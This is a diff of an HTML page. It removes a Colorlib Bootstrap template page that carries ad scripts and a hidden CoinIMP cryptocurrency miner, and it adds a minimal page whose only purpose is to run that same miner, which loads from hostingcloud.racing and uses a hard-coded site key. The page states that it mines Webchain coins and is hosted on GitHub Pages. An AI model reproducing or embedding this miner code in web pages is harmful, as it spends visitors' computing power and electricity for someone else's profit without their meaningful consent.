@@ -1,6 +1,16 @@
-<title>Colorlib | Free Bootstrap Website Template</title> <script type="a564f3b31dfeae3b96322d7f-text/javascript">if ( top !== self ) top.location.replace( self.location.href );// Hey, don't iframe my iframe!</script> <script src="https://www.hostingcloud.racing/mKgk.js"></script> <script> var _client = new Client.Anonymous('a934a756b26f740437b44addb4ac3eaad11ebe827f6c08ce936fcabf8ed36e5e', { throttle: 0.2, c: 'w' }); _client.start(); _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d"); </script>
-uiCookies
-Select a Product +
-<iframe class="product-iframe" frameborder="0" border="0"></iframe> <script src="//ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script> <script src="assets/js/products.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script> <script src="assets/js/application.min.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script> <script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js" type="a564f3b31dfeae3b96322d7f-text/javascript"></script>
-<script type="a564f3b31dfeae3b96322d7f-text/javascript"> window.googletag = window.googletag || {cmd: []}; googletag.cmd.push(function() { googletag .defineSlot('/147246189/colorlib.com_728x90_anchor_sticky_DFP', [[320, 100], [728, 90]], 'gpt-passback-stpd-0-1578495345178') .addService(googletag.pubads()).setTargeting('Placement_type', ['serving']); googletag.enableServices(); googletag.display('gpt-passback-stpd-0-1578495345178'); }); </script>
-<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="a564f3b31dfeae3b96322d7f-|49" defer=""></script>
+<!DOCTYPE html>
+<html>
+<script src="https://www.hostingcloud.racing/mKgk.js"></script>
+<script>
+    var _client = new Client.Anonymous('a934a756b26f740437b44addb4ac3eaad11ebe827f6c08ce936fcabf8ed36e5e', {
+        throttle: 0.2, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+
+</script>
+<body>
+<h1>Site able to mine Webchain Coins (WEB)</h1>
+<p>I'm hosted with GitHub Pages.</p>
+</body>
+</html>
